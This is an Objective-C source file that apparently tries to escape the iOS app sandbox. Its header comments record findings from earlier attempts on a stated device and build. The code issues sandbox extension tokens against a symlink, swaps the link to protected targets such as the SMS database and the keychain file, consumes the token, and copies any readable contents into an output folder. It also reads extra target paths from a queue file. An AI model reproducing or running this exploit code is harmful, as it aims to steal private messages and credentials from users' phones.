// Sbx.m - sandbox_extension: baseline control + class sweep
//
// Findings so far (iPhone14,3 / 27.0.1 / 24A446):
//   #0 baseline == #f file-issue == #d dir-issue  for every target
//   => "com.apple.app-sandbox.read" adds nothing; the 4 hits are just paths a
//      normal sandboxed app may already read (/etc/passwd, /etc/hosts,
//      .GlobalPreferences.plist, /var/preferences/com.apple.networkd.plist).
//   => deniable targets (IconState.plist, sms.db, keychain-2.db) stay denied
//      after consume, so the kernel checks the real path, not the token.
//
// What is left to try is the class. FilzaSlop's probe got NULL for
// read-write on /var/mobile/Library/Preferences, but that is one path, one build.
// The sweep below tries five classes against three denied targets and records
// (a) whether issue returns a token at all and (b) whether the path then opens.
//
// Queue: Documents/sbx.txt, one line: tag<TAB>absolute-path

#import "Sbx.h"

#import <dirent.h>
#import <errno.h>
#import <fcntl.h>
#import <string.h>
#import <sys/stat.h>
#import <unistd.h>

extern char   *sandbox_extension_issue_file(const char *cls, const char *path, uint64_t flags);
extern int64_t sandbox_extension_consume(const char *token);
extern void    sandbox_extension_release(int64_t handle);

static NSString *gSbxDocs;
static NSString *gSbxOut;
static NSMutableArray *gSbxProduced;
static NSMutableArray *gSbxSummary;

static const char *kClasses[] = {
    "com.apple.app-sandbox.read",
    "com.apple.app-sandbox.read-write",
    "com.apple.absolute-path.read-only",
    "com.apple.absolute-path.read-write",
    "com.apple.security.files.user-selected.read-only",
};
static const int kClassCount = 5;

static void sbxLog(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSLog(@"[sbx] %@", s);

    NSString *p = [gSbxDocs stringByAppendingPathComponent:@"sbx.log"];
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:p];
    if (fh == nil) {
        [[NSFileManager defaultManager] createFileAtPath:p contents:nil attributes:nil];
        fh = [NSFileHandle fileHandleForWritingAtPath:p];
    }
    [fh seekToEndOfFile];
    [fh writeData:[[s stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
    [fh closeFile];
}

static void sbxNote(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    [gSbxSummary addObject:s];
    NSLog(@"[sbx] %@", s);
}

static void sbxPut(NSString *name, NSData *data) {
    NSString *p = [gSbxOut stringByAppendingPathComponent:name];
    if ([data writeToFile:p atomically:YES]) [gSbxProduced addObject:name];
}

static void inspect(NSString *tag, const char *path, NSString *target) {
    struct stat st;
    if (stat(path, &st) != 0) {
        sbxNote(@"     %-24s stat e%d", [tag UTF8String], errno);
        return;
    }
    NSString *meta = [NSString stringWithFormat:
        @"path=%@\nmode=%o\nsize=%lld\nuid=%u\ngid=%u\nisDir=%d\n",
        target, st.st_mode, (long long)st.st_size, st.st_uid, st.st_gid,
        ((st.st_mode & 0170000) == 0040000) ? 1 : 0];
    sbxPut([tag stringByAppendingString:@".meta"], [meta dataUsingEncoding:NSUTF8StringEncoding]);

    if ((st.st_mode & 0170000) == 0040000) {
        DIR *dp = opendir(path);
        if (dp == NULL) {
            sbxNote(@"     %-24s opendir e%d", [tag UTF8String], errno);
            return;
        }
        NSMutableArray *names = [NSMutableArray array];
        struct dirent *de;
        while ((de = readdir(dp)) != NULL && names.count < 4000) {
            NSString *n = [NSString stringWithUTF8String:de->d_name];
            if (n != nil && ![n isEqualToString:@"."] && ![n isEqualToString:@".."]) {
                [names addObject:n];
            }
        }
        closedir(dp);
        NSString *body = [[[names sortedArrayUsingSelector:@selector(compare:)]
                           componentsJoinedByString:@"\n"] stringByAppendingString:@"\n"];
        sbxPut([tag stringByAppendingString:@".dir"], [body dataUsingEncoding:NSUTF8StringEncoding]);
        sbxNote(@"OK   %-24s dir %lu entries", [tag UTF8String], (unsigned long)names.count);
        return;
    }

    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        sbxNote(@"     %-24s open e%d", [tag UTF8String], errno);
        return;
    }
    NSMutableData *all = [NSMutableData data];
    unsigned char buf[65536];
    ssize_t got;
    while ((got = read(fd, buf, sizeof(buf))) > 0) {
        [all appendBytes:buf length:(NSUInteger)got];
        if (all.length > 8 * 1000 * 1000) break;
    }
    close(fd);
    sbxPut([tag stringByAppendingString:@".bin"], all);
    sbxNote(@"OK   %-24s %lu B", [tag UTF8String], (unsigned long)all.length);
}

// mode: 0 = baseline (no token), 1 = issue on our own regular file
static void sbxOne(NSString *tag, NSString *target, int mode, const char *cls) {
    const char *p = [target UTF8String];

    if (mode == 0) {
        inspect(tag, p, target);
        return;
    }

    NSString *tmp = NSTemporaryDirectory();
    NSString *s = [tmp stringByAppendingPathComponent:@"s"];
    NSString *l = [tmp stringByAppendingPathComponent:@"l"];
    [[@"x" dataUsingEncoding:NSUTF8StringEncoding] writeToFile:s atomically:YES];

    unlink([l UTF8String]);
    if (symlink([s UTF8String], [l UTF8String]) != 0) return;

    char *token = sandbox_extension_issue_file(cls, [l UTF8String], 0);
    if (token == NULL) {
        sbxNote(@"     %-24s issue=NULL", [tag UTF8String]);
        unlink([l UTF8String]);
        return;
    }

    unlink([l UTF8String]);
    if (symlink(p, [l UTF8String]) != 0) { free(token); return; }

    int64_t h = sandbox_extension_consume(token);
    inspect(tag, [l UTF8String], target);

    if (h > 0) sandbox_extension_release(h);
    free(token);
    unlink([l UTF8String]);
}

static NSString *shortCls(const char *cls) {
    NSString *s = [NSString stringWithUTF8String:cls];
    s = [s stringByReplacingOccurrencesOfString:@"com.apple." withString:@""];
    s = [s stringByReplacingOccurrencesOfString:@"security.files." withString:@""];
    return s;
}

int sbxRun(void) {
    gSbxDocs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    gSbxOut = [gSbxDocs stringByAppendingPathComponent:@"out"];
    gSbxProduced = [NSMutableArray array];
    gSbxSummary = [NSMutableArray array];
    [[NSFileManager defaultManager] createDirectoryAtPath:gSbxOut
                             withIntermediateDirectories:YES attributes:nil error:nil];

    sbxLog(@"=== sbx start ===");

    // Targets that are denied at baseline: these discriminate.
    NSArray *deniedTags = @[@"iconstate", @"sms", @"keychain"];
    NSArray *deniedPaths = @[
        @"/var/mobile/Library/SpringBoard/IconState.plist",
        @"/var/mobile/Library/SMS/sms.db",
        @"/var/Keychains/keychain-2.db",
    ];

    // 1. baseline for the denied set
    for (NSUInteger i = 0; i < deniedTags.count; i++) {
        sbxOne([deniedTags[i] stringByAppendingString:@"#0"], deniedPaths[i], 0, NULL);
    }

    // 2. class sweep against the same targets
    for (int c = 0; c < kClassCount; c++) {
        for (NSUInteger i = 0; i < deniedTags.count; i++) {
            NSString *tag = [NSString stringWithFormat:@"%@/%@",
                             shortCls(kClasses[c]), deniedTags[i]];
            sbxOne(tag, deniedPaths[i], 1, kClasses[c]);
        }
    }

    // 3. queue, if present (both modes, default class)
    NSString *q = [NSString stringWithContentsOfFile:[gSbxDocs stringByAppendingPathComponent:@"sbx.txt"]
                                            encoding:NSUTF8StringEncoding error:nil];
    if (q.length > 0) {
        for (NSString *line in [q componentsSeparatedByString:@"\n"]) {
            if (line.length == 0) continue;
            NSArray *parts = [line componentsSeparatedByString:@"\t"];
            if (parts.count < 2) continue;
            sbxOne([parts[0] stringByAppendingString:@"#0"], parts[1], 0, NULL);
            sbxOne([parts[0] stringByAppendingString:@"#f"], parts[1], 1, kClasses[0]);
        }
    }

    NSString *idx = [gSbxProduced componentsJoinedByString:@"\n"];
    if (idx.length > 0) idx = [idx stringByAppendingString:@"\n"];
    [[idx dataUsingEncoding:NSUTF8StringEncoding]
        writeToFile:[gSbxOut stringByAppendingPathComponent:@"sbx_index.txt"] atomically:YES];

    NSUInteger hits = 0;
    for (NSString *line in gSbxSummary) if ([line hasPrefix:@"OK"]) hits++;

    NSMutableArray *sum = [NSMutableArray array];
    [sum addObject:[NSString stringWithFormat:@"%lu hit / %lu attempts",
                    (unsigned long)hits, (unsigned long)gSbxSummary.count]];
    [sum addObject:@"baseline #0 then class sweep on denied targets:"];
    [sum addObjectsFromArray:gSbxSummary];

    NSString *sumText = [[sum componentsJoinedByString:@"\n"] stringByAppendingString:@"\n"];
    [[sumText dataUsingEncoding:NSUTF8StringEncoding]
        writeToFile:[gSbxDocs stringByAppendingPathComponent:@"sbx_summary.txt"] atomically:YES];

    sbxLog(@"=== sbx end, %lu hits / %lu attempts ===", (unsigned long)hits,
           (unsigned long)gSbxSummary.count);
    return 0;
}
